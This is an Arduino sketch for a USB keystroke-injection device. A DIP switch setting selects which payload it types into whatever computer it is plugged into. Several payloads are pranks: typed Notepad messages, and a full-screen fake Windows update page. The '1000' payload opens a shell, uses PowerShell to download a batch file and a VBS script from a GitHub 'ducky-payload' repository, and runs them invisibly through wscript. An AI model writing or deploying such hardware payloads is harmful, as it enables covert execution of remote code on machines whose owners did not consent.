
//code to use custom DIP switch to control payloads


#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  

  // Wait 500ms

  String dip = ""; // Name of the file that will be opened

  // Sets the given pins as switches for the dip switches
  pinMode(2, INPUT_PULLUP);
  pinMode(3, INPUT_PULLUP);
  pinMode(4, INPUT_PULLUP);
  pinMode(5, INPUT_PULLUP);
  
  // Switches are checked, dip string is contructed
  if (digitalRead(2) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(3) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(4) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(5) == LOW){dip += "1";} else {dip += "0";}

  delay(2000);

  if(dip == "0000"){
    Keyboard.begin();
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(500);
  
    Keyboard.print("notepad");
  
    delay(500);
  
    typeKey(KEY_RETURN);
  
    delay(750);
  
    Keyboard.print("Hello World!!!");
  
    typeKey(KEY_RETURN);
  
    // Ending stream
    Keyboard.end();
  }
  
  if(dip == "0001"){
    Keyboard.begin();
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(500);
  
    Keyboard.print("notepad");
  
    delay(500);
  
    typeKey(KEY_RETURN);
  
    delay(750);
  
    Keyboard.print("Goodbye World!!!");
  
    typeKey(KEY_RETURN);
  
    // Ending stream
    Keyboard.end();
  }

  if(dip == "0010"){
    Keyboard.begin();
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(500);
  
    Keyboard.print("chrome");
  
    delay(200);
  
    typeKey(KEY_RETURN);

    delay(2000);
  
    typeKey(KEY_F6);

    delay(500);
  
    Keyboard.print("http://fakeupdate.net/win7/index.html");
  
    typeKey(KEY_RETURN);

    delay(1000);
  
    typeKey(KEY_F11);
    
    // Ending stream
    Keyboard.end();
  }


  if(dip == "0011"){
    Keyboard.begin();
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(500);
  
    Keyboard.print("chrome");
  
    delay(200);
  
    typeKey(KEY_RETURN);

    delay(2000);
  
    Keyboard.print("http://fakeupdate.net/win7/index.html");
  
    typeKey(KEY_RETURN);

    delay(1000);
  
    typeKey(KEY_F11);
    
    // Ending stream
    Keyboard.end();
  }

  if(dip == "1000"){
    Keyboard.begin();
    delay(100);
    typeKey(KEY_LEFT_GUI);
    delay(400);
    Keyboard.print("cmd");
    delay(300);
    typeKey(KEY_RETURN);
    delay(800);
    Keyboard.print("mkdir misc & cd misc");
    typeKey(KEY_RETURN);
    delay(100);
    Keyboard.print("del NME-base.bat");
    typeKey(KEY_RETURN);
    delay(100);
    Keyboard.print("powershell.exe");
    typeKey(KEY_RETURN);
    delay(100);
    Keyboard.print("wget 'https://raw.githubusercontent.com/aquaktus/ducky-payload/master/NME-base.bat' -UseBasicParsing -O NME-base.bat");
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("wget 'https://raw.githubusercontent.com/aquaktus/ducky-payload/master/invis.vbs' -UseBasicParsing -O invis.vbs");
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("exit");
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print("wscript.exe invis.vbs NME-base.bat");
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print("exit");
    typeKey(KEY_RETURN);
    Keyboard.end();
  }

  
}

/* Unused endless loop */
void loop() {}
